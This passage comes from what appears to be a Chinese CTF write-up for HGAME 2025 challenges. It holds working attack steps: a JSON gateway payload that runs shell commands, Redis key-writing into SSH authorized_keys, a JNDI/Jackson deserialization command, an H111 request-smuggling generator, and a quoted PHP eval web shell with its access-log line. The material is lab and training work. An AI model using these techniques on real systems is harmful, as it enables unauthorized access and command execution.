</span></span></code></pre></div><p><img alt=2025-02-22193119 loading=lazy src=/posts/ctf/hgame2025/2025-02-22193119.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span> {<span style=color:#f92672>&#34;beanName&#34;</span>:<span style=color:#e6db74>&#34;shell&#34;</span>,<span style=color:#f92672>&#34;methodName&#34;</span>:<span style=color:#e6db74>&#34;execForStr&#34;</span>,<span style=color:#f92672>&#34;params&#34;</span>:{<span style=color:#f92672>&#34;arg0&#34;</span>:<span style=color:#e6db74>&#34;utf8&#34;</span>,<span style=color:#f92672>&#34;arg1&#34;</span>:[<span style=color:#e6db74>&#34;whoami&#34;</span>]}}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /api/gateway HTTP/1.1
</span></span><span style=display:flex><span>Host: node1.hgame.vidar.club:31791
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q<span style=color:#f92672>=</span>0.9,en;q<span style=color:#f92672>=</span>0.8,en-GB;q<span style=color:#f92672>=</span>0.7,en-US;q<span style=color:#f92672>=</span>0.6
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; Win64; x64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style=color:#f92672>=</span>0.8,application/signed-exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.7
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Content-Type: application/json
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;beanName&#34;</span>:<span style=color:#e6db74>&#34;shell&#34;</span>,<span style=color:#e6db74>&#34;methodName&#34;</span>:<span style=color:#e6db74>&#34;execForStr&#34;</span>,<span style=color:#e6db74>&#34;params&#34;</span>:<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;arg0&#34;</span>:<span style=color:#e6db74>&#34;utf8&#34;</span>,<span style=color:#e6db74>&#34;arg1&#34;</span>:<span style=color:#f92672>[</span><span style=color:#e6db74>&#34;/readflag&#34;</span><span style=color:#f92672>]}}</span>
</span></span></code></pre></div><p><img alt=2025-02-22193559 loading=lazy src=/posts/ctf/hgame2025/2025-02-22193559.png></p><h3 id=level-257-日落的紫罗兰>Level 257 日落的紫罗兰</h3><p>nmap可以扫一下这两个端口，一个是ssh，一个是redis,redis无密码</p><p>首先的思路是对ssh进行爆破，利用hydra利用字典看看能不能爆出来，没有成功。</p><p>尝试之后ssh连接不了，redis里面没东西，题目给了user.txt，可以尝试写个id_rsa上去</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> ssh-keygen -t rsa
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>echo -e “<span style=color:#ae81ff>\n\n</span>”; cat ./id_rsa.pub; echo -e “<span style=color:#ae81ff>\n\n</span>”<span style=color:#f92672>)</span> &gt; spaced_key.txt
</span></span><span style=display:flex><span> cat spaced_key.txt |redis-cli -h node1.hgame.vidar.club -p <span style=color:#ae81ff>30877</span> -x set ssh_key <span style=color:#75715e>#将 SSH 公钥存储到 Redis 的 ssh_key 键下。</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>!<span style=color:#f92672>[</span>2025-02-22203924<span style=color:#f92672>](</span><span style=color:#ae81ff>\2</span>025-02-22203924.png<span style=color:#f92672>)</span>└─$ redis-cli  -h node1.hgame.vidar.club -p <span style=color:#ae81ff>30877</span>
</span></span><span style=display:flex><span>node1.hgame.vidar.club:30877&gt;  config set dir /home/mysid/.ssh
</span></span><span style=display:flex><span>OK
</span></span><span style=display:flex><span>node1.hgame.vidar.club:30877&gt; config set dbfilename <span style=color:#e6db74>&#34;authorized_keys&#34;</span>
</span></span><span style=display:flex><span>OK
</span></span><span style=display:flex><span>node1.hgame.vidar.club:30877&gt; save
</span></span><span style=display:flex><span>OK
</span></span><span style=display:flex><span>node1.hgame.vidar.club:30877&gt; exit
</span></span></code></pre></div><p>将 Redis 数据存储在 <code>authorized_keys</code> 文件中，了利用 Redis 来管理 SSH 公钥，从而实现远程身份验证。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh -i id_rsa mysid@node1.hgame.vidar.club -p <span style=color:#ae81ff>30156</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>scp -i ./id_rsa -P <span style=color:#ae81ff>30156</span> /JNDIMap-0.0.1.jar mysid@node1.hgame.vidar.club:/tmp
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/usr/local/openjdk-8/bin/java -jar /tmp/JNDIMap-0.0.1.jar -i 127.0.0.1 -l <span style=color:#ae81ff>389</span> -u <span style=color:#e6db74>&#34;/Deserialize/Jackson/Command/Y2htb2QgNzc3IC9mbGFn&#34;</span>
</span></span></code></pre></div><p>再开个窗口先ssh</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> curl -X POST -d <span style=color:#e6db74>&#34;baseDN=a/b&amp;filter=a&#34;</span> http://127.0.0.1:8080/search
</span></span></code></pre></div><p>最后就可以cat /flag了(：</p><p><img alt=2025-02-22203924 loading=lazy src=/posts/ctf/hgame2025/2025-02-22203924.png></p><h3 id=level-111-不存在的车厢>Level 111 不存在的车厢</h3><p>长度字段使用 uint16（2字节），限制单个字段最大为 65535 字节，所以当⼀个⼤于uint16最⼤值的Length被序列化时会 产⽣整数溢出，改变序列化后的语义 H111协议存在pipeline以及连接复⽤，前⾯搁置的部分数据会被按照第⼆个 请求解析并响应，在外部第⼆个请求打到proxy的时候，有⼀定概率复⽤同个连接并⾛私出这⼀部分 response</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>TestGenRequest</span>(<span style=color:#a6e22e>t</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>testing</span>.<span style=color:#a6e22e>T</span>) {
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 创建一个包含完整信息的测试请求</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>testReq</span> <span style=color:#f92672>:=</span> <span style=color:#f92672>&amp;</span><span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Request</span>{
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>Method</span>:     <span style=color:#e6db74>&#34;POST&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>RequestURI</span>: <span style=color:#e6db74>&#34;/flag&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>Header</span>: <span style=color:#66d9ef>map</span>[<span style=color:#66d9ef>string</span>][]<span style=color:#66d9ef>string</span>{
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;Content-Type&#34;</span>: {<span style=color:#e6db74>&#34;application/json&#34;</span>},
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;User-Agent&#34;</span>:   {<span style=color:#e6db74>&#34;test-client&#34;</span>},
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>Body</span>: <span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>NopCloser</span>(<span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>NewReader</span>(<span style=color:#e6db74>&#34;test body&#34;</span>)),
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 序列化请求</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>buf</span> <span style=color:#a6e22e>bytes</span>.<span style=color:#a6e22e>Buffer</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>WriteH111Request</span>(<span style=color:#f92672>&amp;</span><span style=color:#a6e22e>buf</span>, <span style=color:#a6e22e>testReq</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>t</span>.<span style=color:#a6e22e>Fatalf</span>(<span style=color:#e6db74>&#34;expected no error, got %v&#34;</span>, <span style=color:#a6e22e>err</span>)
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 打印序列化后的二进制数据长度和十六进制表示</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>t</span>.<span style=color:#a6e22e>Logf</span>(<span style=color:#e6db74>&#34;Serialized length: %d bytes&#34;</span>, len(<span style=color:#a6e22e>buf</span>.<span style=color:#a6e22e>Bytes</span>()))
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>t</span>.<span style=color:#a6e22e>Logf</span>(<span style=color:#e6db74>&#34;Hex dump: %s&#34;</span>, <span style=color:#a6e22e>hex</span>.<span style=color:#a6e22e>EncodeToString</span>(<span style=color:#a6e22e>buf</span>.<span style=color:#a6e22e>Bytes</span>()))
</span></span></code></pre></div><p>放在protocol/request_test.go，通过gotest-v拿到输出</p><p>最后放yakit里</p><p><img alt=2025-02-22211012 loading=lazy src=/posts/ctf/hgame2025/2025-02-22211012.png></p><h1 id=misc>Misc</h1><h3 id=computer-cleaner>Computer cleaner</h3><p>正常导入vm</p><p>搜索危险函数</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>grep -rn <span style=color:#e6db74>&#34;eval(&#34;</span> /var/www/html
</span></span><span style=display:flex><span>/var/www/html/uploads/shell.php:1:&lt;?php @eval<span style=color:#f92672>(</span>$_POST<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;hgame{y0u_&#39;</span><span style=color:#f92672>])</span>;?&gt;
</span></span></code></pre></div><p>然后看/var/log里面的日志</p><p>有一天是<code>121.41.34.25</code>访问得到第二部分flag</p><p>第三部分也是看日志</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>1.41.34.25 - - <span style=color:#f92672>[</span>17/Jan/2025:12:02:05 +0000<span style=color:#f92672>]</span> <span style=color:#e6db74>&#34;GET /uploads/shell.php?cmd=cat%20~/Documents/flag_part3 HTTP/1.1&#34;</span> <span style=color:#ae81ff>200</span> <span style=color:#ae81ff>2048</span> <span style=color:#e6db74>&#34;-&#34;</span> <span style=color:#e6db74>&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36&#34;</span>
</span></span><span style=display:flex><span>vidar@vidar-computer:/var/www/html$ cat ~/Documents/flag_part3
</span></span><span style=display:flex><span>_c0mput3r!<span style=color:#f92672>}</span>
</span></span></code></pre></div><p>最后得到</p><pre tabindex=0><code>hgame{y0u_hav3_cleaned_th3_c0mput3r!}
</code></pre><h3 id=computer-cleaner-plus>Computer cleaner plus</h3><p>进行ps发现denied，查看一下发现后门</p><p><img alt=2025-02-22140449 loading=lazy src=/posts/ctf/hgame2025/2025-02-22140449.png></p><p><code>hgame{B4ck_D0_oR}</code></p></div></div></div><button id=tocFab class=toc-fab type=button aria-label="Toggle TOC">目录</button><aside id=tocDrawer class=toc-drawer aria-hidden=true><div class=toc-drawer-head><div class=toc-drawer-title>目录</div><button id=tocClose class=toc-close type=button aria-label="Close TOC">×</button></div><nav class=toc-drawer-body><nav id=TableOfContents><ul><li><a href=#week1>Week1</a><ul><li><a href=#web>web</a><ul><li><a href=#level-24-pacman>Level 24 Pacman</a></li><li><a href=#level-47-bandbomb>Level 47 BandBomb</a></li><li><a href=#mysterymessageboard>MysteryMessageBoard</a></li><li><a href=#level-25-双面人派对>Level 25 双面人派对</a></li><li><a href=#level-38475-角落>Level 38475 角落</a></li></ul></li></ul></li><li><a href=#week2>week2</a><ul><li><a href=#web-1>web</a><ul><li><a href=#level-21096-honeypot>Level 21096 HoneyPot</a></li><li><a href=#level-21096-honeypot_revenge>Level 21096 HoneyPot_Revenge</a></li><li><a href=#level-60-signinjava>Level 60 SignInJava</a></li><li><a href=#level-257-日落的紫罗兰>Level 257 日落的紫罗兰</a></li><li><a href=#level-111-不存在的车厢>Level 111 不存在的车厢</a></li></ul></li></ul></li><li><a href=#misc>Misc</a><ul><li><ul><li><a href=#computer-cleaner>Computer cleaner</a></li><li><a href=#computer-cleaner-plus>Computer cleaner plus</a></li></ul></li></ul></li></ul></nav></nav></aside><script>(function(){const s=document.getElementById("tocFab"),e=document.getElementById("tocDrawer"),o=document.getElementById("tocClose");if(!s||!e)return;const t="pm_toc_open";function i(){e.classList.add("open"),e.setAttribute("aria-hidden","false");try{localStorage.setItem(t,"1")}catch{}}function n(){e.classList.remove("open"),e.setAttribute("aria-hidden","true");try{localStorage.setItem(t,"0")}catch{}}function a(){e.classList.contains("open")?n():i()}s.addEventListener("click",a),o&&o.addEventListener("click",n),document.addEventListener("keydown",e=>{e.key==="Escape"&&n()});try{localStorage.getItem(t)==="1"&&i()}catch{}})()</script><nav class=paginav><a class=prev href=http://blog.0ran9e.cn/posts/%E6%B8%97%E9%80%8F/ciscnccb-isw-%E6%B8%97%E9%80%8F-web-git/><span class=title>«</span><br><span>ciscn&amp;ccb-ISW 渗透 web-git</span>
</a><a class=next href=http://blog.0ran9e.cn/posts/ctf/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2025/><span class=title>»</span><br><span>春秋杯冬季赛2025</span></a></nav></article></main><footer class=footer><span>© 2026
<a href=http://blog.0ran9e.cn/>0raN9e's Blog</a>· Powered by <a href=https://gohugo.io/>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod>PaperMod</a>· adapted by <span style=letter-spacing:.12em>0ran9e</span></span></footer></body></html>